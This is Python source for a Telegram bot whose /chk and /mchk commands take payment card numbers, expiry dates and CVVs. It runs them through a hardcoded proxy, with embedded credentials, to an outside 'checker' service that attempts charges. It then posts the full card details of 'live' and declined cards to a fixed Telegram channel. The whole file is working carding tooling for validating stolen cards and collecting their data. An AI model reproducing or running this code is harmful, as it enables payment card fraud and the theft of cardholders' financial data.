from pyrogram import Client, filters
import requests
import json
from EQUROBOT import app

channel_id = '-1002196680748'  # Replace with your channel ID

# Helper function to divide the amount by 100
def divide_by_100(amount):
    return amount / 100 if amount else 0

# Command handler for /chk cc
@app.on_message(filters.command("chk"))
async def check_single_card(client, message):
    try:
        card_details = message.text.split()[1]
    except IndexError:
        await message.reply_text("Please provide card details in the format: /chk cc|mm|yyyy|cvv")
        return

    # Inform the user that the request is being processed
    processing_message = await message.reply_text("Processing your request...")

    # API endpoint and parameters
    url = "https://freechecker.hrk.dev/checker"
    params = {
        'cc': card_details,
        'proxy': "http://iplayer-ueg9g.getfoxyproxy.org:13129:babelill:lilybeck"  # Updated proxy
    }

    # Make the API request
    response = requests.get(url, params=params)
    try:
        response_json = response.json()
    except json.JSONDecodeError:
        await processing_message.edit_text(f"Failed to decode response for {card_details}.\nResponse text: {response.text}")
        return

    # Process the response
    payment_info = response_json.get('payment', {})
    status = payment_info.get('status', 'failed')
    amount = payment_info.get('amount', 0)
    divided_amount = divide_by_100(amount)
    currency = payment_info.get('currency', 'UNKNOWN')
    intent = payment_info.get('message', {}).get('intent', 'UNKNOWN')
    message_info = payment_info.get('message', {})
    decline_reason = message_info.get('failed_reason_message', 'UNKNOWN')
    text = message_info.get('text', 'UNKNOWN')

    if status == 'succeeded':
        success_message = (f"┏━━━━━━━⍟\n"
                           f"┃ CHARGE {divided_amount} {currency} ✅\n"
                           f"┗━━━━━━━━━━━⊛\n"
                           f"➩ CARD: `{card_details}`\n"
                           f"➩ RESPONSE: *Payment Successful!✅*\n"
                           f"➩ PAYMENT INTENT ID: `{intent}`\n"
                           f"➩ AMOUNT: `{divided_amount}` `{currency}`\n\n")
        await processing_message.edit_text(success_message)
        await client.send_message(channel_id, success_message)
    else:
        decline_message = (f"┏━━━━━━━⍟\n"
                           f"┃ CARD DECLINED ❌\n"
                           f"┗━━━━━━━━━━━⊛\n"
                           f"➩ CARD: `{card_details}`\n"
                           f"➩ RESPONSE: *Payment Declined!❌*\n"
                           f"➩ REASON: `{decline_reason}`\n"
                           f"➩ MESSAGE: `{text}`\n\n")
        await processing_message.edit_text(decline_message)
        await client.send_message(channel_id, decline_message)

# Command handler for /mchk
@app.on_message(filters.command("mchk"))
async def check_multiple_cards(client, message):
    card_details_list = message.text.split()[1:]
    num_cards = len(card_details_list)

    if num_cards < 1 or num_cards > 10:
        await message.reply_text("Please provide between 1 and 10 card details in the format: /mchk cc1|mm1|yyyy1|cvv1 cc2|mm2|yyyy2|cvv2 ...")
        return

    # Inform the user that the request is being processed
    processing_message = await message.reply_text("Processing your request...")

    total_cards = num_cards
    checked_cards = 0
    live_cards = 0
    charged_cards = []
    declined_cards = []
    user_counts = {'charged_cc_count': 0, 'checked_cc_count': 0, 'total_cc_count': total_cards}

    for card_details in card_details_list:
        card_details = card_details.strip()
        if not card_details:
            continue

        # API endpoint and parameters
        url = "https://freechecker.hrk.dev/checker"
        params = {
            'cc': card_details,
            'proxy': "http://iplayer-ueg9g.getfoxyproxy.org:13129:babelill:lilybeck"  # Updated proxy
        }

        # Make the API request
        response = requests.get(url, params=params)
        try:
            response_json = response.json()
        except json.JSONDecodeError:
            continue

        # Process the response
        payment_info = response_json.get('payment', {})
        status = payment_info.get('status', 'failed')
        amount = payment_info.get('amount', 0)
        divided_amount = divide_by_100(amount)
        currency = payment_info.get('currency', 'UNKNOWN')
        intent = payment_info.get('message', {}).get('intent', 'UNKNOWN')
        message_info = payment_info.get('message', {})
        decline_reason = message_info.get('failed_reason_message', 'UNKNOWN')
        text = message_info.get('text', 'UNKNOWN')

        if status == 'succeeded':
            live_cards += 1
            charged_cards.append((card_details, divided_amount, currency, intent))
            user_counts['charged_cc_count'] += 1
        else:
            declined_cards.append((card_details, decline_reason, text))

        checked_cards += 1
        user_counts['checked_cc_count'] = checked_cards

    # Send summary of the processed cards
    summary_text = (f"┏━━━━━━━⍟\n"
                    f"┃ Total Cards Checked: {checked_cards}\n"
                    f"┃ Live Cards: {live_cards}\n"
                    f"┗━━━━━━━━━━━⊛")
    await processing_message.edit_text(summary_text)

    # Send details of the charged cards
    for card, amount, currency, intent in charged_cards:
        success_message = (f"┏━━━━━━━⍟\n"
                           f"┃ CHARGE {amount} {currency} ✅\n"
                           f"┗━━━━━━━━━━━⊛\n"
                           f"➩ CARD: `{card}`\n"
                           f"➩ RESPONSE: *Payment Successful!✅*\n"
                           f"➩ PAYMENT INTENT ID: `{intent}`\n"
                           f"➩ AMOUNT: `{amount}` `{currency}`\n\n")
        await client.send_message(channel_id, success_message)
        await message.reply_text(success_message)

    # Optionally, send details of declined cards
    for card, decline_reason, text in declined_cards:
        decline_message = (f"┏━━━━━━━⍟\n"
                           f"┃ CARD DECLINED ❌\n"
                           f"┗━━━━━━━━━━━⊛\n"
                           f"➩ CARD: `{card}`\n"
                           f"➩ RESPONSE: *Payment Declined!❌*\n"
                           f"➩ REASON: `{decline_reason}`\n"
                           f"➩ MESSAGE: `{text}`\n\n")
        await client.send_message(channel_id, decline_message)
        await message.reply_text(decline_message)
